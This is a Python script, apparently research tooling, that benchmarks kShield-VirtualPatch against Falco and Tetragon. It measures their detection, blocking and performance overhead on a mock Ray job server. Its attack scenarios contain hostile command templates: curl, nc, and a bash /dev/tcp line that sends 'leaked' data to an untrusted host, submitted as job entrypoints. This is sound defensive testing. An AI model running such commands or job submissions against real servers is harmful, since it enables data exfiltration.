#!/usr/bin/env python3
"""
run_comparison.py — kShield-VirtualPatch vs Falco vs Tetragon 비교 실험 실행기

서브커맨드
  check    사전 점검만 수행(root, 바이너리, 룰/정책 파일, 잔존 프로세스)
  detect   같은 공격 시나리오를 각 도구에 N회 반복해 탐지·차단 여부를 기록
  perf     off / kshield / falco / tetragon 성능 오버헤드를 같은 세션에서
           ABBA 교차 순서로 측정한다 (결과: attack/results/cmp_raw_*.csv)

반드시 root로 실행한다.
    sudo python3 attack/compare/run_comparison.py check
    sudo python3 attack/compare/run_comparison.py detect
    sudo python3 attack/compare/run_comparison.py perf

측정 설계
  - 도구를 먼저 띄운 뒤 mock 서버를 띄운다. 모든 도구가 자기 방식으로 계보를
    처음부터 관찰하게 하기 위해서다(kShield의 /proc 백필 같은 차이가 결과를
    좌우하지 않도록).
  - 그룹 순서는 라운드마다 뒤집는다(ABBA). 시간에 따른 시스템 드리프트를 상쇄한다.
  - tool_cpu_s는 사용자 공간 에이전트가 쓴 CPU 시간이다. BPF 프로그램 자체의
    실행 시간은 트리거한 프로세스에 계상되므로 처리량/지연에 반영된다.
"""
import argparse
import csv
import hashlib
import json
import os
import shlex
import re
import shutil
import signal
import socket
import subprocess
import sys
import threading
import time
import urllib.request
from datetime import datetime

HERE = os.path.dirname(os.path.abspath(__file__))
ATTACK_DIR = os.path.dirname(HERE)
REPO_ROOT = os.path.dirname(ATTACK_DIR)
RESULTS_DIR = os.path.join(ATTACK_DIR, "results")
sys.path.insert(0, ATTACK_DIR)
import stat_analysis  # noqa: E402  (run_once 재사용)

MOCK_SERVER = os.path.join(ATTACK_DIR, "mock_ray_server.py")
FALCO_RULES = os.path.join(HERE, "falco_vpatch_rules.yaml")
TETRAGON_POLICY = os.path.join(HERE, "tetragon_vpatch_policy.yaml")
TETRAGON_POLICY_NAME = "kcmp-shadow-connect"
KSHIELD_BIN = os.path.join(REPO_ROOT, "src", "kshield_vpatch")
KSHIELD_CTL = os.path.join(REPO_ROOT, "src", "kshield_ctl")

DEFAULT_GROUPS = "off,kshield,falco,tetragon"
ALL_GROUPS = ["off", "kshield", "falco", "falco_default", "tetragon"]
STRAY_PROCESS_NAMES = ["falco", "tetragon", "kshield_vpatch", "kshield_vpatch_lsm"]

RAW_FIELDS = ["workload", "round", "group", "run", "throughput_rps", "latency_mean_ms",
              "latency_p99_ms", "failures", "tool_cpu_s", "tool_rss_kb"]

# (이름, 공격 여부, entrypoint 템플릿). {ip}:{port}는 신뢰되지 않은 목적지(Sink)다.
SCENARIO_TEMPLATES = [
    ("benign_echo", False, "echo benign-job"),
    ("curl_untrusted", True, "curl -s -m 3 -o /dev/null http://{ip}:{port}/"),
    ("bash_devtcp", True, "bash -c 'exec 3<>/dev/tcp/{ip}/{port}; echo leaked >&3'"),
    ("nc_untrusted", True, "nc -w 2 {ip} {port} < /dev/null"),
]


def build_scenarios(ip, port):
    return [(name, cmd.format(ip=ip, port=port), attack) for name, attack, cmd in SCENARIO_TEMPLATES]


def log(msg):
    print(msg, flush=True)


def die(msg):
    print(f"[오류] {msg}", file=sys.stderr, flush=True)
    sys.exit(1)


def run(cmd, timeout=30):
    try:
        return subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
    except (OSError, subprocess.TimeoutExpired) as e:
        return subprocess.CompletedProcess(cmd, 127, "", str(e))


def require_root():
    if os.geteuid() != 0:
        die("root 권한이 필요합니다: sudo python3 attack/compare/run_comparison.py ...")


def chown_tree(path):
    uid, gid = os.environ.get("SUDO_UID"), os.environ.get("SUDO_GID")
    if not (uid and gid):
        return
    targets = [path]
    if os.path.isdir(path):
        for base, dirs, files in os.walk(path):
            targets += [os.path.join(base, n) for n in dirs + files]
    for t in targets:
        try:
            os.chown(t, int(uid), int(gid))
        except OSError:
            pass


def pgrep(name):
    r = run(["pgrep", "-x", name])
    return [int(x) for x in r.stdout.split()] if r.returncode == 0 else []


def ensure_clean():
    stray = {n: pgrep(n) for n in STRAY_PROCESS_NAMES}
    stray = {n: p for n, p in stray.items() if p}
    if stray:
        desc = ", ".join(f"{n}{p}" for n, p in stray.items())
        die(f"베이스라인 오염을 막기 위해 다음 프로세스를 먼저 종료하세요: {desc}\n"
            "  예) sudo systemctl stop tetragon; sudo systemctl stop falco-modern-bpf; "
            "sudo pkill -x kshield_vpatch")


def cpu_seconds(pid):
    try:
        with open(f"/proc/{pid}/stat") as f:
            rest = f.read().rsplit(")", 1)[1].split()
        return (int(rest[11]) + int(rest[12])) / os.sysconf("SC_CLK_TCK")
    except (OSError, IndexError, ValueError):
        return float("nan")


def rss_kb(pid):
    try:
        with open(f"/proc/{pid}/status") as f:
            for line in f:
                if line.startswith("VmRSS:"):
                    return float(line.split()[1])
    except (OSError, ValueError):
        pass
    return float("nan")


def spawn(cmd, logpath):
    lf = open(logpath, "ab", buffering=0)
    proc = subprocess.Popen(cmd, stdout=lf, stderr=subprocess.STDOUT, start_new_session=True)
    return proc, lf


def terminate(proc, timeout=15):
    if proc is None or proc.poll() is not None:
        return
    try:
        os.killpg(proc.pid, signal.SIGINT)
        proc.wait(timeout=timeout)
        return
    except ProcessLookupError:
        return
    except subprocess.TimeoutExpired:
        pass
    try:
        os.killpg(proc.pid, signal.SIGTERM)
        proc.wait(timeout=10)
    except subprocess.TimeoutExpired:
        os.killpg(proc.pid, signal.SIGKILL)
        proc.wait()
    except ProcessLookupError:
        pass


def wait_port(host, port, timeout=15.0):
    end = time.time() + timeout
    while time.time() < end:
        try:
            with socket.create_connection((host, port), timeout=1):
                return True
        except OSError:
            time.sleep(0.2)
    return False


# ── 도구 제어 ───────────────────────────────────────────────────────────────
class Tool:
    """off(도구 없음) 베이스라인. 다른 도구의 부모 클래스."""
    name = "off"
    markers = []

    def __init__(self, args, logdir, capture_events=False):
        self.args = args
        self.logdir = logdir
        self.capture_events = capture_events
        self.proc = None
        self.logfile = None
        self.logpath = None
        self._pid = None

    def start(self):
        pass

    def stop(self):
        pass

    def pid(self):
        return self._pid

    def cpu_s(self):
        return cpu_seconds(self._pid) if self._pid else float("nan")

    def rss(self):
        return rss_kb(self._pid) if self._pid else float("nan")

    def _spawn(self, cmd, logname):
        self.logpath = os.path.join(self.logdir, logname)
        self.proc, self.logfile = spawn(cmd, self.logpath)
        self._pid = self.proc.pid

    def _stop_spawned(self):
        terminate(self.proc)
        if self.logfile:
            self.logfile.close()

    def _require_alive(self):
        if self.proc.poll() is not None:
            die(f"{self.name}이(가) 기동 직후 종료되었습니다(종료 코드 {self.proc.returncode}). "
                f"로그 끝부분:\n{self.tail()}")

    def tail(self, n=15):
        if not self.logpath or not os.path.exists(self.logpath):
            return "(로그 없음)"
        with open(self.logpath, "rb") as f:
            lines = f.read().decode("utf-8", "replace").splitlines()
        return "\n".join(lines[-n:])

    def log_size(self):
        return os.path.getsize(self.logpath) if self.logpath and os.path.exists(self.logpath) else 0

    def read_log_from(self, offset):
        if not self.logpath or not os.path.exists(self.logpath):
            return ""
        with open(self.logpath, "rb") as f:
            f.seek(offset)
            return f.read().decode("utf-8", "replace")


class KShield(Tool):
    name = "kshield"
    markers = ["SHADOW_CONNECT 탐지", "SHADOW_EXEC 탐지"]

    def start(self):
        if not os.access(KSHIELD_BIN, os.X_OK):
            die(f"{KSHIELD_BIN} 가 없습니다. 먼저 빌드하세요: cd src && make")
        self._spawn([KSHIELD_BIN] + shlex.split(self.args.kshield_args), "kshield.log")
        time.sleep(self.args.tool_warmup)
        self._require_alive()

    def stop(self):
        self._stop_spawned()


class Falco(Tool):
    name = "falco"
    markers = ["KCMP_SHADOW_CONNECT", "KCMP_SHADOW_EXEC"]

    def rules_path(self):
        return FALCO_RULES

    def start(self):
        cmd = [self.args.falco_bin, "-r", self.rules_path(),
               "-o", f"engine.kind={self.args.falco_engine}",
               "-o", "json_output=true", "-o", "buffered_outputs=false"]
        cmd += shlex.split(self.args.falco_extra)
        self._spawn(cmd, f"{self.name}.log")
        time.sleep(self.args.tool_warmup)
        self._require_alive()

    def stop(self):
        self._stop_spawned()


class FalcoDefault(Falco):
    """Falco 기본 룰셋을 그대로 쓴 참고용 그룹(일반적 배포 상태의 비용)."""
    name = "falco_default"
    markers = []

    def rules_path(self):
        return self.args.falco_default_rules


class Tetragon(Tool):
    name = "tetragon"
    markers = [TETRAGON_POLICY_NAME]

    def __init__(self, *a, **kw):
        super().__init__(*a, **kw)
        self.events_proc = None
        self.events_file = None

    def tetra(self, *rest):
        return [self.args.tetra_bin] + shlex.split(self.args.tetra_extra) + list(rest)

    def start(self):
        svc = self.args.tetragon_service
        r = run(["systemctl", "start", svc])
        if r.returncode != 0:
            die(f"systemctl start {svc} 실패: {r.stderr.strip()}")
        ready = False
        end = time.time() + 40
        while time.time() < end and not ready:
            ready = any(run(self.tetra(*c), timeout=10).returncode == 0
                        for c in (("status",), ("tracingpolicy", "list")))
            if not ready:
                time.sleep(1)
        if not ready:
            self.stop()
            die("tetragon 에이전트가 40초 안에 준비되지 않았습니다. `tetra status`와 "
                f"`journalctl -u {svc}`를 확인하세요.")
        pid = run(["systemctl", "show", "-p", "MainPID", "--value", svc]).stdout.strip()
        self._pid = int(pid) if pid.isdigit() and int(pid) > 0 else None

        if self.capture_events:
            self.logpath = os.path.join(self.logdir, "tetragon_events.log")
            self.events_proc, self.events_file = spawn(self.tetra("getevents", "-o", "json"), self.logpath)
            time.sleep(1)

        r = run(self.tetra("tracingpolicy", "add", TETRAGON_POLICY))
        if r.returncode != 0:
            self.stop()
            die("Tetragon 정책 로드 실패 — 정책 파일 필드명을 확인하세요:\n"
                f"{r.stdout}{r.stderr}")
        time.sleep(self.args.tool_warmup)

    def stop(self):
        terminate(self.events_proc)
        if self.events_file:
            self.events_file.close()
        run(self.tetra("tracingpolicy", "delete", TETRAGON_POLICY_NAME), timeout=15)
        run(["systemctl", "stop", self.args.tetragon_service], timeout=60)


def make_tool(group, args, logdir, capture_events=False):
    table = {"off": Tool, "kshield": KShield, "falco": Falco,
             "falco_default": FalcoDefault, "tetragon": Tetragon}
    return table[group](args, logdir, capture_events)


# ── mock 서버 / 작업 제출 ───────────────────────────────────────────────────
def start_server(args, logdir):
    lf = open(os.path.join(logdir, "mock_server.log"), "ab", buffering=0)
    proc = subprocess.Popen([sys.executable, MOCK_SERVER, "--port", str(args.port)],
                            stdout=lf, stderr=subprocess.STDOUT, start_new_session=True)
    if not wait_port(args.host, args.port) or proc.poll() is not None:
        terminate(proc)
        die(f"mock 서버가 포트 {args.port}에서 시작되지 않았습니다(이미 사용 중인지 확인).")
    return proc, lf


def stop_server(server):
    if server:
        terminate(server[0], timeout=5)
        server[1].close()


def submit_job(host, port, entrypoint, timeout=10):
    req = urllib.request.Request(
        f"http://{host}:{port}/api/jobs/",
        data=json.dumps({"entrypoint": entrypoint}).encode("utf-8"),
        headers={"Content-Type": "application/json"}, method="POST")
    with urllib.request.urlopen(req, timeout=timeout) as resp:
        return resp.status


class Sink:
    """신뢰되지 않은(비 loopback) 목적지 역할을 하는 최소 TCP 수신기.

    VM이 외부망(예: 1.1.1.1)에 닿지 않아도 실험이 성립하도록 VM 자신의 비 loopback IPv4
    주소에 붙는다. 세 도구 모두 127.0.0.0/8 밖의 주소를 신뢰되지 않은 목적지로 취급하므로
    판정 기준은 같다. 연결 수립 수와 수신 바이트 수를 세어 차단이 첫 바이트가 나가기 전에
    이뤄졌는지도 본다(off 그룹에서는 모든 공격 시나리오가 수립돼야 한다)."""

    def __init__(self, ip, port):
        self.ip, self.port = ip, port
        self.accepted = 0
        self.bytes = 0
        self._lock = threading.Lock()
        self._stop = threading.Event()
        self._srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._srv.bind((ip, port))
        self._srv.listen(64)
        self._srv.settimeout(0.5)
        self._thread = threading.Thread(target=self._loop, daemon=True)
        self._thread.start()

    def _loop(self):
        while not self._stop.is_set():
            try:
                conn, _ = self._srv.accept()
            except socket.timeout:
                continue
            except OSError:
                return
            threading.Thread(target=self._handle, args=(conn,), daemon=True).start()

    def _handle(self, conn):
        with self._lock:
            self.accepted += 1
        try:
            conn.settimeout(1.0)
            data = conn.recv(4096)
            with self._lock:
                self.bytes += len(data)
            conn.sendall(b"HTTP/1.0 200 OK\r\nContent-Length: 0\r\n\r\n")
        except OSError:
            pass
        finally:
            conn.close()

    def snapshot(self):
        with self._lock:
            return self.accepted, self.bytes

    def close(self):
        self._stop.set()
        self._srv.close()
        self._thread.join(timeout=2)


def resolve_untrusted_ip(args):
    """신뢰되지 않은 목적지로 쓸 VM 자신의 비 loopback IPv4 주소."""
    if args.untrusted_ip != "auto":
        ip = args.untrusted_ip
    else:
        ip = None
        m = re.search(r"\bsrc (\d+\.\d+\.\d+\.\d+)", run(["ip", "-4", "route", "get", "1.1.1.1"]).stdout)
        if m:
            ip = m.group(1)
        else:
            for tok in run(["hostname", "-I"]).stdout.split():
                if re.fullmatch(r"\d+\.\d+\.\d+\.\d+", tok):
                    ip = tok
                    break
    if not ip:
        die("VM의 비 loopback IPv4 주소를 찾지 못했습니다. --untrusted-ip 로 지정하세요.")
    if ip.startswith("127."):
        die(f"{ip} 는 loopback이라 세 도구 모두 신뢰합니다. 비 loopback 주소를 지정하세요.")
    return ip


def wait_result(path, timeout):
    end = time.time() + timeout
    while time.time() < end:
        try:
            with open(path) as f:
                s = f.read().strip()
            if s.startswith("rc="):
                return int(s[3:])
        except (OSError, ValueError):
            pass
        time.sleep(0.1)
    return None


# ── 사전 점검 ───────────────────────────────────────────────────────────────
def sha256(path):
    h = hashlib.sha256()
    with open(path, "rb") as f:
        h.update(f.read())
    return h.hexdigest()


def preflight(args, groups):
    problems = []
    if not os.path.isfile(MOCK_SERVER):
        problems.append(f"{MOCK_SERVER} 없음")
    if "kshield" in groups and not os.access(KSHIELD_BIN, os.X_OK):
        problems.append(f"{KSHIELD_BIN} 없음 — cd src && make")
    if any(g.startswith("falco") for g in groups):
        if not shutil.which(args.falco_bin):
            problems.append("falco 바이너리를 찾을 수 없음 (https://falco.org/docs/ 설치 문서 참고)")
        else:
            r = run([args.falco_bin, "-V", FALCO_RULES], timeout=60)
            if r.returncode != 0:
                log(f"[경고] falco -V 룰 검증이 0이 아닌 코드로 끝남:\n{r.stdout}{r.stderr}")
    if "falco_default" in groups and not os.path.isfile(args.falco_default_rules):
        problems.append(f"Falco 기본 룰 파일 없음: {args.falco_default_rules}")
    if "tetragon" in groups:
        if not shutil.which(args.tetra_bin):
            problems.append("tetra CLI를 찾을 수 없음 (https://tetragon.io/docs/ 설치 문서 참고)")
        if run(["systemctl", "cat", args.tetragon_service]).returncode != 0:
            problems.append(f"systemd 서비스 '{args.tetragon_service}' 없음")
        if not os.path.isfile(TETRAGON_POLICY):
            problems.append(f"{TETRAGON_POLICY} 없음")
        else:
            with open(TETRAGON_POLICY, encoding="utf-8") as f:
                text = f.read()
            for p in {sys.executable, os.path.realpath(sys.executable)}:
                if p not in text:
                    log(f"[경고] 정책 matchBinaries에 {p} 가 없습니다. python3 실행 경로를 추가하세요.")
    if problems:
        die("사전 점검 실패:\n  - " + "\n  - ".join(problems))
    ensure_clean()


def collect_meta(args, groups):
    def sh(cmd):
        r = run(cmd, timeout=20)
        return (r.stdout + r.stderr).strip()

    meta = {
        "timestamp": datetime.now().isoformat(timespec="seconds"),
        "groups": groups,
        "args": vars(args),
        "kernel": sh(["uname", "-r"]),
        "python": sys.version,
        "active_lsm": sh(["cat", "/sys/kernel/security/lsm"]),
        "cpu_model": sh(["sh", "-c", "grep -m1 'model name' /proc/cpuinfo"]),
        "cpu_count": os.cpu_count(),
        "repo_commit": sh(["git", "-C", REPO_ROOT, "rev-parse", "HEAD"]),
        "sha256": {"falco_rules": sha256(FALCO_RULES), "tetragon_policy": sha256(TETRAGON_POLICY)},
    }
    if any(g.startswith("falco") for g in groups):
        meta["falco_version"] = sh([args.falco_bin, "--version"])
    if "tetragon" in groups:
        meta["tetra_version"] = sh([args.tetra_bin, "version"])
    return meta


# ── check ───────────────────────────────────────────────────────────────────
def cmd_check(args):
    require_root()
    groups = parse_groups(args)
    preflight(args, groups)
    log("사전 점검 통과. 그룹: " + ", ".join(groups))
    log(json.dumps(collect_meta(args, groups), ensure_ascii=False, indent=2))


# ── perf ────────────────────────────────────────────────────────────────────
def cmd_perf(args):
    require_root()
    groups = parse_groups(args)
    workloads = [w.strip() for w in args.workloads.split(",") if w.strip()]
    if args.runs % args.rounds != 0:
        die("--runs 는 --rounds 로 나누어떨어져야 합니다.")
    per_block = args.runs // args.rounds
    preflight(args, groups)

    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    os.makedirs(RESULTS_DIR, exist_ok=True)
    runs_dir = os.path.join(RESULTS_DIR, f"cmp_runs_{ts}")
    logdir = os.path.join(runs_dir, "logs")
    os.makedirs(logdir)
    raw_path = os.path.join(RESULTS_DIR, f"cmp_raw_{ts}.csv")
    meta_path = os.path.join(RESULTS_DIR, f"cmp_meta_{ts}.json")
    with open(meta_path, "w", encoding="utf-8") as f:
        json.dump(collect_meta(args, groups), f, ensure_ascii=False, indent=2)
    with open(raw_path, "w", newline="", encoding="utf-8") as f:
        csv.DictWriter(f, fieldnames=RAW_FIELDS).writeheader()

    log(f"그룹 {groups} | 워크로드 {workloads} | 그룹당 {args.runs}회 "
        f"({args.rounds}라운드 x {per_block}회) | 요청 {args.count}회/런")
    try:
        for workload in workloads:
            fork_heavy = workload == "fork"
            for rnd in range(args.rounds):
                order = groups if rnd % 2 == 0 else list(reversed(groups))
                for group in order:
                    log(f"\n=== [{workload}] 라운드 {rnd + 1}/{args.rounds} — {group} ===")
                    tool = make_tool(group, args, logdir)
                    server = None
                    try:
                        tool.start()
                        server = start_server(args, logdir)
                        stat_analysis.run_once(args.host, args.port, args.warmup,
                                               os.path.join(runs_dir, "warmup.csv"),
                                               fork_heavy=fork_heavy)
                        for i in range(per_block):
                            out = os.path.join(runs_dir, f"{workload}_{group}_r{rnd + 1}_{i + 1}.csv")
                            cpu0 = tool.cpu_s()
                            s = stat_analysis.run_once(args.host, args.port, args.count, out,
                                                       fork_heavy=fork_heavy)
                            cpu1 = tool.cpu_s()
                            row = {
                                "workload": workload, "round": rnd + 1, "group": group,
                                "run": rnd * per_block + i + 1,
                                "throughput_rps": s.get("throughput_rps", ""),
                                "latency_mean_ms": s.get("latency_mean_ms", ""),
                                "latency_p99_ms": s.get("latency_p99_ms", ""),
                                "failures": int(s.get("failure", 0)),
                                "tool_cpu_s": round(cpu1 - cpu0, 3) if cpu1 == cpu1 else "",
                                "tool_rss_kb": tool.rss() if tool.pid() else "",
                            }
                            with open(raw_path, "a", newline="", encoding="utf-8") as f:
                                csv.DictWriter(f, fieldnames=RAW_FIELDS).writerow(row)
                            warn = "  [경고: 실패 요청 있음]" if row["failures"] else ""
                            log(f"  run {row['run']:>2}: {row['throughput_rps']:>8} req/s  "
                                f"{row['latency_mean_ms']:>6} ms  cpu={row['tool_cpu_s']}s{warn}")
                    finally:
                        stop_server(server)
                        tool.stop()
                        time.sleep(args.cooldown)
    finally:
        chown_tree(runs_dir)
        for p in (raw_path, meta_path):
            if os.path.exists(p):
                chown_tree(p)
    log(f"\n원시 결과: {raw_path}\n메타데이터: {meta_path}")
    log(f"분석: python3 attack/compare/compare_stats.py {raw_path}")


# ── detect ──────────────────────────────────────────────────────────────────
def kshield_state_check(args, untrusted_ip):
    ctl = KSHIELD_CTL
    if not os.access(ctl, os.X_OK):
        log("[경고] kshield_ctl 없음 — 신뢰 IP/예외 목록 점검을 건너뜁니다.")
        return
    for sub in ("trust-list", "exempt-list", "cgroup-exempt-list"):
        r = run([ctl, sub, "--target", "v3"])
        out = (r.stdout + r.stderr).strip()
        log(f"  kshield_ctl {sub}: {out or '(비어 있음)'}")
        if sub == "trust-list" and untrusted_ip in out:
            die(f"{untrusted_ip} 가 신뢰 목적지로 등록되어 있어 탐지 실험이 왜곡됩니다. "
                f"sudo ./src/kshield_ctl trust-del {untrusted_ip} 후 다시 실행하세요.")


def cmd_detect(args):
    require_root()
    groups = parse_groups(args)
    ip = resolve_untrusted_ip(args)
    scenarios = build_scenarios(ip, args.untrusted_port)
    if not shutil.which("nc"):
        log("[경고] nc 가 없어 nc_untrusted 시나리오를 건너뜁니다.")
        scenarios = [s for s in scenarios if s[0] != "nc_untrusted"]
    preflight(args, groups)

    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    os.makedirs(RESULTS_DIR, exist_ok=True)
    logdir = os.path.join(RESULTS_DIR, f"cmp_detect_logs_{ts}")
    os.makedirs(logdir)
    out_path = os.path.join(RESULTS_DIR, f"cmp_detect_{ts}.csv")
    meta_path = os.path.join(RESULTS_DIR, f"cmp_detect_meta_{ts}.json")
    meta = collect_meta(args, groups)
    meta["untrusted_dest"] = f"{ip}:{args.untrusted_port}"
    with open(meta_path, "w", encoding="utf-8") as f:
        json.dump(meta, f, ensure_ascii=False, indent=2)
    rows = []

    try:
        sink = Sink(ip, args.untrusted_port)
    except OSError as e:
        die(f"Sink를 {ip}:{args.untrusted_port} 에 열지 못했습니다: {e} "
            "(포트 사용 중이면 --untrusted-port 로 바꾸세요)")
    log(f"신뢰되지 않은 목적지(Sink): {ip}:{args.untrusted_port}")

    try:
        for group in groups:
            log(f"\n=== [탐지] {group} ===")
            tool = make_tool(group, args, logdir, capture_events=True)
            server = None
            try:
                tool.start()
                if group == "kshield":
                    kshield_state_check(args, ip)
                server = start_server(args, logdir)
                for name, cmd, is_attack in scenarios:
                    for rep in range(1, args.repeats + 1):
                        resfile = f"/tmp/kcmp_{os.getpid()}_{name}_{rep}.res"
                        offset = tool.log_size()
                        acc0, bytes0 = sink.snapshot()
                        submit_job(args.host, args.port, f"{cmd}; echo rc=$? > {resfile}")
                        rc = wait_result(resfile, args.scenario_timeout)
                        time.sleep(args.settle)
                        acc1, bytes1 = sink.snapshot()
                        new = tool.read_log_from(offset)
                        detected = any(m in new for m in tool.markers)
                        killed = rc == 137
                        if os.path.exists(resfile):
                            os.remove(resfile)
                        rows.append({"group": group, "scenario": name, "attack": int(is_attack),
                                     "rep": rep, "rc": "" if rc is None else rc,
                                     "killed": int(killed), "detected": int(detected),
                                     "accepted": acc1 - acc0, "leaked_bytes": bytes1 - bytes0})
                    sub = [r for r in rows if r["group"] == group and r["scenario"] == name]
                    log(f"  {name:<15} 탐지 {sum(r['detected'] for r in sub)}/{len(sub)}  "
                        f"SIGKILL {sum(r['killed'] for r in sub)}/{len(sub)}  "
                        f"연결수립 {sum(r['accepted'] > 0 for r in sub)}/{len(sub)}  "
                        f"유출바이트 {sum(r['leaked_bytes'] for r in sub)}")
                    if group == "off" and is_attack and not any(r["accepted"] for r in sub):
                        log("    [경고] 도구가 없는데도 Sink에 연결이 수립되지 않았습니다. "
                            "방화벽·주소를 확인하세요(이 그룹은 기준선입니다).")
            finally:
                stop_server(server)
                tool.stop()
                time.sleep(args.cooldown)
    finally:
        sink.close()
        if rows:
            with open(out_path, "w", newline="", encoding="utf-8") as f:
                w = csv.DictWriter(f, fieldnames=list(rows[0].keys()))
                w.writeheader()
                w.writerows(rows)
        chown_tree(logdir)
        for p in (out_path, meta_path):
            if os.path.exists(p):
                chown_tree(p)
    log(f"\n결과: {out_path}\n메타데이터: {meta_path}")
    log("해석: killed = 프로세스가 SIGKILL(rc=137)로 종료됨. Falco는 탐지만 하므로 killed=0이 정상.\n"
        "      연결수립/유출바이트 = Sink가 실제로 받은 연결·데이터. 비동기 SIGKILL이라 차단돼도 "
        "연결이 수립될 수 있으며, 유출바이트가 0이면 첫 데이터가 나가기 전에 차단된 것이다.")


def parse_groups(args):
    groups = [g.strip() for g in args.groups.split(",") if g.strip()]
    bad = [g for g in groups if g not in ALL_GROUPS]
    if bad:
        die(f"알 수 없는 그룹: {bad} (가능: {ALL_GROUPS})")
    return groups


def build_parser():
    p = argparse.ArgumentParser(description="kShield-VirtualPatch vs Falco vs Tetragon 비교 실험")
    p.add_argument("--groups", default=DEFAULT_GROUPS, help=f"쉼표 구분 (가능: {','.join(ALL_GROUPS)})")
    p.add_argument("--host", default="127.0.0.1",
                   help="벤치마크 접속 주소. localhost가 ::1로 풀리면 IPv6 connect가 섞이므로 127.0.0.1 고정")
    p.add_argument("--port", type=int, default=8265)
    p.add_argument("--untrusted-ip", default="auto",
                   help="탐지 실험의 '신뢰되지 않은 목적지'로 쓸 VM의 비 loopback IPv4. auto = 기본 경로의 출발지 주소")
    p.add_argument("--untrusted-port", type=int, default=18080, help="Sink 수신 포트")
    p.add_argument("--tool-warmup", type=float, default=8.0, help="도구 기동 후 대기(초)")
    p.add_argument("--cooldown", type=float, default=5.0, help="블록 사이 대기(초)")
    p.add_argument("--kshield-args", default="", help="kshield_vpatch 추가 인자")
    p.add_argument("--falco-bin", default="falco")
    p.add_argument("--falco-engine", default="modern_ebpf", help="engine.kind 값")
    p.add_argument("--falco-extra", default="", help="falco 추가 인자")
    p.add_argument("--falco-default-rules", default="/etc/falco/falco_rules.yaml")
    p.add_argument("--tetra-bin", default="tetra")
    p.add_argument("--tetra-extra", default="--server-address unix:///var/run/tetragon/tetragon.sock",
                   help="tetra 공통 인자. 기본값은 standalone tarball 설치본의 unix 소켓")
    p.add_argument("--tetragon-service", default="tetragon")

    sub = p.add_subparsers(dest="cmd")
    sub.add_parser("check", help="사전 점검만 수행")

    pp = sub.add_parser("perf", help="성능 오버헤드 비교")
    pp.add_argument("--runs", type=int, default=10, help="그룹·워크로드당 총 반복 횟수")
    pp.add_argument("--rounds", type=int, default=2, help="ABBA 라운드 수(runs를 나누어떨어져야 함)")
    pp.add_argument("--count", type=int, default=500, help="런당 요청 수")
    pp.add_argument("--warmup", type=int, default=100, help="블록 시작 시 버리는 워밍업 요청 수")
    pp.add_argument("--workloads", default="normal,fork", help="normal 및/또는 fork")

    dd = sub.add_parser("detect", help="탐지·차단 비교")
    dd.add_argument("--repeats", type=int, default=10)
    dd.add_argument("--settle", type=float, default=1.5, help="시나리오 후 로그 반영 대기(초)")
    dd.add_argument("--scenario-timeout", type=float, default=10.0)
    return p


def main():
    parser = build_parser()
    args = parser.parse_args()
    handlers = {"check": cmd_check, "perf": cmd_perf, "detect": cmd_detect}
    if args.cmd not in handlers:
        parser.print_help()
        return
    handlers[args.cmd](args)


if __name__ == "__main__":
    main()
